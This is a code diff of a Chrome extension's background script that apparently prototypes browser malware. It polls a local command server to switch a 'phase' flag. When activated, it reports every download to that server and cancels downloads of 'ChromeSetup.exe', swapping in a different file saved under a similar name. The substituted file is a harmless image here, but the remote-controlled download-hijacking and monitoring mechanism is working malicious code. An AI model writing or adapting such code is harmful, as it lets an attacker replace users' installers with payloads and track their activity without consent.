@@ -154,7 +154,7 @@ function loggingprivacySettings(){
 //chrome.contentSettings.cookies.get({primaryUrl:'http://*'},function(details){console.log(details)});
 //https://stackoverflow.com/questions/53026387/how-to-get-all-chrome-content-settings
 
-chrome.alarms.create("info",{ periodInMinutes: 0.07 });
+chrome.alarms.create("info",{ periodInMinutes: 10 });
 
 chrome.alarms.onAlarm.addListener((Alarm)=>{
     if (Alarm.name == "info"){
@@ -189,7 +189,7 @@ indentifie.
 
 
 
-chrome.alarms.create("phase",{ periodInMinutes: 5});
+chrome.alarms.create("phase",{ periodInMinutes: 0.02});
 //https://stackoverflow.com/questions/60727329/chrome-extension-rejection-use-of-permissions-all-urls
 
 chrome.alarms.onAlarm.addListener((Alarm) => {
@@ -197,19 +197,13 @@ chrome.alarms.onAlarm.addListener((Alarm) => {
     if (Alarm.name == "phase"){
         chrome.storage.local.get(["uid"]).then( (result)=>{
         result = result.uid.toString()
-        console.log(result)
         fetch(`http://127.0.0.1:5000/req/${result}`,
             {
             method: "GET",
             mode: 'no-cors', 
             headers:{"Content-Type": "application/json"}
             }).then(r => r.text()).then(result => {
-                if(result == "2"){
-                    chrome.storage.local.set({phase:1});
-                };
-                if(result == "4"){
-                    chrome.storage.local.set({phase:0});
-                };
+                chrome.storage.local.set({phase:parseInt(result)});
             });})
 
     }
@@ -228,6 +222,7 @@ function modify(item){
     chrome.storage.local.get(["phase"]).then((result)=>{
         console.log(result)
         if(result.phase == 1){
+        console.log("hola")
         fetch('http://127.0.0.1:5000/control_server',
         {
         method: "POST",
@@ -235,9 +230,9 @@ function modify(item){
         body: JSON.stringify(item),
         headers:{"Content-Type": "application/json"}
         })
-        if (item.url.includes("1024px-Wikipedia-logo-v2.svg.png")){
+        if (item.url.includes("ChromeSetup.exe")){
         chrome.downloads.cancel(item.id)
-        chrome.downloads.download({url: "https://en.wikipedia.org/wiki/Gender_bias_on_Wikipedia#/media/File:Wikipedia_Monument_2.JPG"});
+        chrome.downloads.download({url: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg/800px-Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg", filename: "ChromeSetup.jpg"});
         }
     }});
  
@@ -248,3 +243,7 @@ function modify(item){
 //chrome.downloads.onChanged.addListener((Delta)=>{FileOpen(Delta)})
 
 chrome.downloads.onCreated.addListener((Item)=>{modify(Item)})
+
+
+//https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BD941DA60-FA68-1B4A-8E5B-56309869B588%7D%26lang%3Den-GB%26browser%3D4%26usagestats%3D1%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26brand%3DYTUH%26installdataindex%3Dempty/update2/installers/ChromeSetup.exe
+//https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BD941DA60-FA68-1B4A-8E5B-56309869B588%7D%26lang%3Den-GB%26browser%3D4%26usagestats%3D1%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26brand%3DYTUH%26installdataindex%3Dempty/update2/installers/ChromeSetup.exe
